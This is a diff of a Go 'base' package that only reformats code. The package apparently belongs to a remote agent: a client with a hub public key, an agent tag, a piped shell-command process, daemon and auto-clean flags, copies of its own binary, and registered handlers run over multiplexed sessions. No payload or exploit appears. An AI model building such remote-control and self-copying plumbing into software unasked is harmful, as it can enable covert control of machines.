@@ -1,70 +1,70 @@
 package base
 
 import (
-	"net"
 	"io"
-//	"os"
+	"net"
+	//	"os"
 	"os/exec"
 	"sync"
-//	"time"
-	"runtime"
+	//	"time"
 	"crypto/rand"
+	"runtime"
 
-	kit "local/toolkit"
-	"local/streamcoder"
 	"lib/smux"
+	"local/streamcoder"
+	kit "local/toolkit"
 )
 
-var ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))
-var inits = make([](func (*Client)()), 0)
+var ops = make(map[string](func(string, net.Conn, *Client, *smux.Session)))
+var inits = make([](func(*Client)), 0)
 
 type Client struct {
-	UUID       []byte
-	cmd        *exec.Cmd
-	cmdOut     io.ReadCloser
-	cmdIn      io.WriteCloser
-	cmdMx      sync.Mutex
-	Proc       int
-	AgentTag   string
-	HubPubKey  []byte
-	HubKeyTag  string
-	Daemon     bool
-	AutoClean  bool
-	Info       *Info
-	MasterKey  []byte
+	UUID      []byte
+	cmd       *exec.Cmd
+	cmdOut    io.ReadCloser
+	cmdIn     io.WriteCloser
+	cmdMx     sync.Mutex
+	Proc      int
+	AgentTag  string
+	HubPubKey []byte
+	HubKeyTag string
+	Daemon    bool
+	AutoClean bool
+	Info      *Info
+	MasterKey []byte
 
-	Dial       func(addr string) (net.Conn, error)
+	Dial func(addr string) (net.Conn, error)
 
-	binMx      sync.Mutex
-	selfbyte   []byte
-	selfhex    []byte
-	selfbyte1  []byte
-	selfhex1   []byte
+	binMx     sync.Mutex
+	selfbyte  []byte
+	selfhex   []byte
+	selfbyte1 []byte
+	selfhex1  []byte
 }
 
-func NewClient() (*Client) {
+func NewClient() *Client {
 	return &Client{
-		AgentTag: clientAgentTag,
+		AgentTag:  clientAgentTag,
 		HubKeyTag: initKeyTag,
-		Proc: 1,
-		Info: NewInfo(),
-		Daemon: false,
+		Proc:      1,
+		Info:      NewInfo(),
+		Daemon:    false,
 	}
 }
 
-func NewClientM() (*Client) {
+func NewClientM() *Client {
 	return &Client{
-		AgentTag: clientAgentTag,
+		AgentTag:  clientAgentTag,
 		HubKeyTag: initKeyTag,
-		Proc: runtime.NumCPU(),
-		Info: NewInfo(),
-		Daemon: false,
+		Proc:      runtime.NumCPU(),
+		Info:      NewInfo(),
+		Daemon:    false,
 	}
 }
 
-var RegOps = func (tag string, fn (func (string, net.Conn, *Client, *smux.Session)()) ) {
+var RegOps = func(tag string, fn func(string, net.Conn, *Client, *smux.Session)) {
 	if ops == nil {
-		ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))
+		ops = make(map[string](func(string, net.Conn, *Client, *smux.Session)))
 	}
 
 	if fn == nil {
@@ -74,9 +74,9 @@ var RegOps = func (tag string, fn (func (string, net.Conn, *Client, *smux.Sessio
 	}
 }
 
-var RegInit = func (fn (func (*Client)()) ) {
+var RegInit = func(fn func(*Client)) {
 	if inits == nil {
-		inits = make([](func (*Client)()), 0)
+		inits = make([](func(*Client)), 0)
 	}
 
 	inits = append(inits, fn)
@@ -117,7 +117,6 @@ func (c *Client) Start(addr string) {
 
 		kit.WriteTagStr(conn, c.HubKeyTag)
 		conn.Write(ciphertext)
-
 
 		// do encode
 		// key = 32 bytes x 2
@@ -216,4 +215,3 @@ func (c *Client) handle1(p1 net.Conn, mux *smux.Session) {
 	kit.WriteVLen(p1, int64(0))
 	fn(mode, p1, c, mux)
 }
-
